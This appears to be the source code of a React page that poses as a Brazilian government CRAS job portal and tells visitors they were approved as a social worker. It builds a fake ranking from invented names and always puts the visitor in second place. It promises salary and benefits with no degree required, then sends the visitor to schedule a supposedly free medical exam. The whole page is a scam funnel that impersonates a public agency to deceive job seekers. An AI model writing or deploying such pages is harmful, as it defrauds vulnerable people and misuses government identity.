import React, { useEffect, useState } from 'react';
import { Users, Facebook, Instagram } from 'lucide-react';

interface CrasUnit {
  name: string;
  address: string;
  phone: string;
  vacancies: number;
  city?: string;
}

interface Candidate {
  name: string;
  score: number;
  isUser: boolean;
}

const ApprovalPage: React.FC = () => {
  const [selectedUnit, setSelectedUnit] = useState<CrasUnit | null>(null);
  const [candidates, setCandidates] = useState<Candidate[]>([]);
  const [userCity, setUserCity] = useState('');
  const [userState, setUserState] = useState('');

  const stateVacancies: Record<string, number> = {
    'AC': 5, 'AL': 6, 'AP': 4, 'AM': 8, 'BA': 15, 'CE': 10, 'DF': 7, 'ES': 6,
    'GO': 9, 'MA': 8, 'MT': 7, 'MS': 6, 'MG': 20, 'PA': 8, 'PB': 5, 'PR': 25,
    'PE': 10, 'PI': 5, 'RJ': 30, 'RN': 6, 'RS': 20, 'RO': 5, 'RR': 4, 'SC': 12,
    'SP': 50, 'SE': 5, 'TO': 5
  };

  const stateNames: Record<string, string> = {
    'AC': 'Acre', 'AL': 'Alagoas', 'AP': 'Amapá', 'AM': 'Amazonas', 'BA': 'Bahia', 
    'CE': 'Ceará', 'DF': 'Distrito Federal', 'ES': 'Espírito Santo', 'GO': 'Goiás', 
    'MA': 'Maranhão', 'MT': 'Mato Grosso', 'MS': 'Mato Grosso do Sul', 'MG': 'Minas Gerais', 
    'PA': 'Pará', 'PB': 'Paraíba', 'PR': 'Paraná', 'PE': 'Pernambuco', 'PI': 'Piauí', 
    'RJ': 'Rio de Janeiro', 'RN': 'Rio Grande do Norte', 'RS': 'Rio Grande do Sul', 
    'RO': 'Rondônia', 'RR': 'Roraima', 'SC': 'Santa Catarina', 'SP': 'São Paulo', 
    'SE': 'Sergipe', 'TO': 'Tocantins'
  };

  const femaleNames = [
    'MARIA SILVA SANTOS', 'ANA BEATRIZ COSTA', 'JULIANA FERREIRA SOUZA', 'CARLA CRISTINA RODRIGUES',
    'FERNANDA MARIA BORGES', 'PATRICIA HELENA MARTINS', 'AMANDA CAROLINE DIAS', 'VIVIANE CRISTIANE NUNES',
    'CLAUDIA REGINA ALVES', 'SIMONE APARECIDA CRUZ', 'DANIELA CRISTINE MOURA', 'LUCIANA TORRES SILVA',
    'ROBERTA SANTOS LIMA', 'SANDRA CRISTINA ROCHA', 'MONICA APARECIDA LIMA', 'RENATA GOMES PEREIRA',
    'CRISTINA MARIA OLIVEIRA', 'ELISANGELA JOSE SILVA', 'VANESSA CRISTINA ALMEIDA', 'KARINA SOUZA MACHADO'
  ];

  const maleNames = [
    'JOÃO CARLOS OLIVEIRA', 'PEDRO HENRIQUE LIMA', 'RAFAEL AUGUSTO PEREIRA', 'LUCAS GABRIEL ALMEIDA',
    'DIEGO ANTONIO BARBOSA', 'THIAGO EDUARDO ROCHA', 'BRUNO RAFAEL GOMES', 'CARLOS EDUARDO SILVA',
    'MARCOS ANTONIO LIMA', 'ANDRE LUIS FERREIRA'
  ];

  const generateRanking = () => {
    const state = localStorage.getItem('candidateState') || 'SP';
    const city = localStorage.getItem('candidateCity') || 'São Paulo';
    const userName = localStorage.getItem('candidateName') || 'CANDIDATO USUARIO';
    
    setUserState(state);
    setUserCity(city);

    // Get number of vacancies
    const unit = JSON.parse(localStorage.getItem('selectedCrasUnit') || '{}');
    let vacancies;
    if (unit && unit.vacancies) {
      vacancies = parseInt(unit.vacancies);
      setSelectedUnit(unit);
    } else {
      vacancies = stateVacancies[state] || 10;
    }
    
    // Generate candidates with 70% female, 30% male
    const otherCandidatesCount = vacancies - 1;
    const femaleCount = Math.floor(otherCandidatesCount * 0.7);
    const maleCount = otherCandidatesCount - femaleCount;
    
    const candidateList: Candidate[] = [];
    
    // Add female candidates
    const shuffledFemales = [...femaleNames].sort(() => Math.random() - 0.5);
    for (let i = 0; i < femaleCount; i++) {
      candidateList.push({
        name: shuffledFemales[i] || `CANDIDATA ${i + 1}`,
        score: 19 - (i * 0.5) - Math.random() * 2,
        isUser: false
      });
    }
    
    // Add male candidates
    const shuffledMales = [...maleNames].sort(() => Math.random() - 0.5);
    for (let i = 0; i < maleCount; i++) {
      candidateList.push({
        name: shuffledMales[i] || `CANDIDATO ${i + 1}`,
        score: 19 - ((femaleCount + i) * 0.5) - Math.random() * 2,
        isUser: false
      });
    }
    
    // Shuffle and sort by score
    candidateList.sort(() => Math.random() - 0.5);
    candidateList.sort((a, b) => b.score - a.score);
    
    // Add user as 2nd place
    if (candidateList.length >= 1) {
      const firstPlaceScore = candidateList[0] ? candidateList[0].score : 19;
      const userCandidate: Candidate = {
        name: userName.toUpperCase(),
        score: firstPlaceScore - 0.5,
        isUser: true
      };
      candidateList.splice(1, 0, userCandidate);
    } else {
      candidateList.push({
        name: userName.toUpperCase(),
        score: 19,
        isUser: true
      });
    }
    
    // Ensure we have exactly the number of vacancies
    while (candidateList.length > vacancies) {
      candidateList.pop();
    }
    
    setCandidates(candidateList);
  };

  useEffect(() => {
    generateRanking();
  }, []);

  const handleScheduleExam = () => {
    window.history.pushState({}, '', '/agendamento');
    window.location.reload();
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Government Header */}
      <header className="bg-[#222222] text-white py-2">
        <div className="container mx-auto flex justify-between items-center px-4">
          <a className="font-bold text-sm" href="#">
            <img 
              src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" 
              alt="Logotipo Governo" 
              className="h-6"
            />
          </a>
          <nav>
            <ul className="flex space-x-4 text-[10px]">
              <li>
                <a className="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
              </li>
              <li>
                <a className="hover:underline" href="#">PARTICIPE</a>
              </li>
              <li>
                <a className="hover:underline" href="#">SERVIÇOS</a>
              </li>
            </ul>
          </nav>
        </div>
      </header>

      {/* CRAS Header */}
      <div className="bg-[#044785] py-3">
        <div className="container mx-auto px-4 text-center">
          <img 
            src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" 
            alt="Logo CRAS" 
            className="h-8 mx-auto"
          />
        </div>
      </div>

      <main className="flex-grow container mx-auto px-4 py-8">
        <main className="container mx-auto px-4 py-2 mt-4 max-w-[1200px]">
          <div className="bg-green-50 text-green-800 py-3 px-6 text-center rounded-md mb-6">
            <h1 className="text-lg uppercase tracking-wide">Parabéns! Você foi aprovado para a vaga de Assistente Social do CRAS</h1>
          </div>
          
          {/* Ranking Information */}
          <div className="mb-6">
            <div className="text-center mb-4">
              <h2 className="text-lg font-bold text-gray-800 mb-2">🏆 Classificação Final</h2>
              <p className="text-gray-700 font-medium">
                Você ficou em <strong>2º lugar</strong> na seleção de vagas de <span>{userCity} - {stateNames[userState] || userState}</span>
              </p>
            </div>
            
            {/* Ranking Table */}
            <div className="overflow-x-auto">
              <table className="w-full max-w-5xl mx-auto border border-gray-300 rounded-lg bg-white shadow-lg">
                <thead className="bg-gray-100">
                  <tr>
                    <th className="border border-gray-300 px-1 py-2 text-center font-semibold w-12">Pos.</th>
                    <th className="border border-gray-300 px-6 py-2 text-left font-semibold">Nome do Candidato</th>
                    <th className="border border-gray-300 px-1 py-2 text-center font-semibold w-16">Nota</th>
                  </tr>
                </thead>
                <tbody>
                  {candidates.map((candidate, index) => (
                    <tr key={index} className={candidate.isUser ? 'bg-green-50 border-green-200' : ''}>
                      <td className="border border-gray-300 px-1 py-2 font-bold text-center w-12">{index + 1}º</td>
                      <td className={`border border-gray-300 px-6 py-2 ${candidate.isUser ? 'font-bold text-green-700' : ''}`}>
                        {candidate.name}
                      </td>
                      <td className="border border-gray-300 px-1 py-2 text-center font-bold w-16">
                        {candidate.score.toFixed(1)}/20
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
          
          <div className="mb-6">
            <p className="mb-3 text-base">Informamos que você foi aprovado com sucesso nos exames online para a vaga de Assistente Social do CRAS. Seu processo de seleção foi avaliado e aprovado, estando liberado para realizar o curso de preparação.</p>
          </div>

          {/* Job Information Section */}
          <div className="m-0">
            <div className="relative w-full min-h-[550px] p-6 bg-white border border-gray-200 rounded-lg shadow-sm">
              <div className="mb-6">
                <h2 className="text-xl font-bold text-gray-900 mb-4">
                  💼 Informações da Vaga - Assistente Social
                </h2>
                
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <h3 className="font-semibold text-gray-900 mb-3">Local de Trabalho:</h3>
                    {selectedUnit ? (
                      <>
                        <p className="text-gray-700 mb-2"><strong>Unidade:</strong> {selectedUnit.name}</p>
                        <p className="text-gray-700 mb-2"><strong>Endereço:</strong> {selectedUnit.address}</p>
                        <p className="text-gray-700 mb-2"><strong>Cidade:</strong> {userCity}</p>
                        <p className="text-gray-700 mb-4"><strong>Vagas Disponíveis:</strong> {selectedUnit.vacancies}</p>
                      </>
                    ) : (
                      <>
                        <p className="text-gray-700 mb-2"><strong>Unidade:</strong> CRAS PARQUE FLAMBOYANT (Unidade I)</p>
                        <p className="text-gray-700 mb-2"><strong>Endereço:</strong> AVENIDA Bela Vista, Pça Deputado João Natal, Parque Flamboyant - {userCity.toUpperCase()}/{userState}</p>
                        <p className="text-gray-700 mb-2"><strong>Cidade:</strong> {userState}</p>
                        <p className="text-gray-700 mb-4"><strong>Vagas Disponíveis:</strong> 2</p>
                      </>
                    )}
                    
                    <h3 className="font-semibold text-gray-900 mb-3">Condições de Trabalho:</h3>
                    <p className="text-gray-700 mb-1"><strong>Carga Horária:</strong> 40 horas semanais</p>
                    <p className="text-gray-700 mb-1"><strong>Horário:</strong> 08:00 às 17:00 (Segunda a Sexta)</p>
                    <p className="text-gray-700 mb-1"><strong>Salário:</strong> R$ 4.500 - R$ 5.500</p>
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-900 mb-3">Benefícios:</h3>
                    <ul className="space-y-1 text-gray-700 mb-4">
                      <li>• Vale transporte</li>
                      <li>• Vale alimentação (R$ 1.320,00)</li>
                      <li>• Plano de saúde básico</li>
                      <li>• 13º salário</li>
                      <li>• Férias remuneradas</li>
                    </ul>
                    
                    <h3 className="font-semibold text-gray-900 mb-3">Requisitos:</h3>
                    <p className="text-gray-700 mb-2">✓ <strong>Não é necessário</strong> curso superior ou técnico</p>
                    <p className="text-gray-700 mb-2">✓ Ensino médio completo</p>
                    <p className="text-gray-700 mb-4">✓ O CRAS oferecerá <strong>curso gratuito</strong> de Serviço Social para sua preparação</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Requirements and Documentation Section */}
          <div className="container px-4 mt-4">
            <div className="flex items-center gap-3 mb-6 bg-red-100 p-4 rounded">
              <div className="w-8 h-8 flex items-center justify-center">
                ⚠️
              </div>
              <h1 className="text-lg font-bold text-red-600">Para concluir o processo e garantir sua vaga no CRAS verifique os Requisitos abaixo:</h1>
            </div>

            <div className="relative">
              {/* Vertical progress bar */}
              <div className="absolute left-4 top-0 bottom-0 w-1 bg-gradient-to-b from-green-500 to-green-500" style={{backgroundSize: '100% 45%'}}></div>
              <div className="absolute left-4 top-0 bottom-0 w-1 bg-gray-300" style={{top: '45%'}}></div>

              {/* Content */}
              <div className="space-y-4 pl-11">
                {/* Approved items */}
                <div className="bg-green-100 rounded p-4 flex items-center -ml-1 mr-5">
                  <img src="https://png.pngtree.com/png-vector/20220812/ourmid/pngtree-check-3d-icon-png-image_6108005.png" alt="Check icon" className="w-10 h-10 mr-4 absolute -left-1" />
                  <span className="text-base text-gray-800 font-medium">Aprovação no exame teórico</span>
                </div>

                <div className="bg-green-100 rounded p-4 flex items-center -ml-1 mr-5">
                  <img src="https://png.pngtree.com/png-vector/20220812/ourmid/pngtree-check-3d-icon-png-image_6108005.png" alt="Check icon" className="w-10 h-10 mr-4 absolute -left-1" />
                  <span className="text-base text-gray-800 font-medium">Avaliação técnica CRAS</span>
                </div>

                <div className="bg-green-100 rounded p-4 flex items-center -ml-1 mr-5">
                  <img src="https://png.pngtree.com/png-vector/20220812/ourmid/pngtree-check-3d-icon-png-image_6108005.png" alt="Check icon" className="w-10 h-10 mr-4 absolute -left-1" />
                  <span className="text-base text-gray-800 font-medium">Documentação básica</span>
                </div>

                {/* Pending item */}
                <div className="bg-red-100 rounded p-4">
                  <div className="flex items-center">
                    <img src="https://static.vecteezy.com/system/resources/previews/017/209/854/non_2x/red-wrong-3d-ui-icon-free-png.png" alt="X icon" className="w-12 h-12 mr-4 absolute -left-2" />
                    <span className="text-base text-gray-800 font-medium">Realizar exame médico de admissão</span>
                  </div>
                  <button 
                    onClick={handleScheduleExam}
                    className="bg-red-600 text-white font-bold py-2 px-4 rounded mt-3 hover:bg-red-700 transition-colors duration-200"
                  >
                    AGENDAR AGORA
                  </button>
                </div>

                {/* Upcoming item */}
                <div className="bg-gray-200 rounded p-4 flex items-center -ml-1 mr-5">
                  <img src="https://icones.pro/wp-content/uploads/2021/02/icone-de-tique-ronde-grise.png" alt="Check icon" className="w-7 h-7 mr-4 absolute left-0" />
                  <span className="text-base text-gray-800 font-medium">Efetivar Contratação</span>
                </div>
                
                <p className="text-xs text-gray-600 mt-1">
                  Para garantir sua vaga de emprego no <strong>CRAS</strong> é obrigatório realizar o <strong>exame médico de admissão</strong> que é oferecido <strong>gratuitamente pelo CRAS</strong>. O exame garante que você está apto para exercer as funções de Assistente Social.
                </p>
                <p className="text-xs text-gray-600 mt-2">
                  Após o exame de admissão, é necessário levar os <strong>documentos pessoais</strong>, <strong>resultado do exame médico</strong> e a <strong>carteira de trabalho</strong> na unidade do CRAS para efetivação da contratação.
                </p>
              </div>
            </div>
          </div>
        </main>
      </main>

      {/* Footer */}
      <footer className="bg-[#044785] text-white py-8 md:py-12">
        <div className="container mx-auto px-4 md:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">O que é o CRAS</a></li>
                <li><a href="#" className="hover:text-gray-200">Missão e Valores</a></li>
                <li><a href="#" className="hover:text-gray-200">Onde Atuamos</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Serviços</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Proteção Social Básica</a></li>
                <li><a href="#" className="hover:text-gray-200">Atendimento às Famílias</a></li>
                <li><a href="#" className="hover:text-gray-200">Grupos de Convivência</a></li>
                <li><a href="#" className="hover:text-gray-200">Benefícios Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Assistência Social</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Cadastro Único</a></li>
                <li><a href="#" className="hover:text-gray-200">Bolsa Família</a></li>
                <li><a href="#" className="hover:text-gray-200">BPC</a></li>
                <li><a href="#" className="hover:text-gray-200">Auxílio Brasil</a></li>
                <li><a href="#" className="hover:text-gray-200">Programas Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Vagas</a></li>
                <li><a href="#" className="hover:text-gray-200">Portal do Servidor</a></li>
                <li><a href="#" className="hover:text-gray-200">Capacitações</a></li>
                <li><a href="#" className="hover:text-gray-200">Concursos</a></li>
              </ul>
            </div>
          </div>
          
          <hr className="border-blue-400 mb-6" />
          
          <div className="flex flex-col md:flex-row justify-between items-center text-xs text-white">
            <div className="mb-4 md:mb-0">
              <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
            </div>
            <div className="flex flex-wrap justify-center gap-2 md:gap-4">
              <a href="#" className="hover:text-gray-200">Mapa do Site</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Política de Privacidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Lei de Acesso à Informação</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Acessibilidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Ouvidoria</a>
            </div>
            <div className="flex space-x-4 mt-4 md:mt-0">
              <a href="#" className="text-white hover:text-gray-200">
                <Facebook size={16} />
              </a>
              <a href="#" className="text-white hover:text-gray-200">
                <Instagram size={16} />
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* Floating Accessibility Icon */}
      <a 
        href="#" 
        className="fixed bottom-4 right-4 bg-blue-600 p-3 rounded-full shadow-lg hover:bg-blue-700 transition-colors z-50"
      >
        <Users className="w-6 h-6 text-white" />
      </a>
    </div>
  );
};

export default ApprovalPage;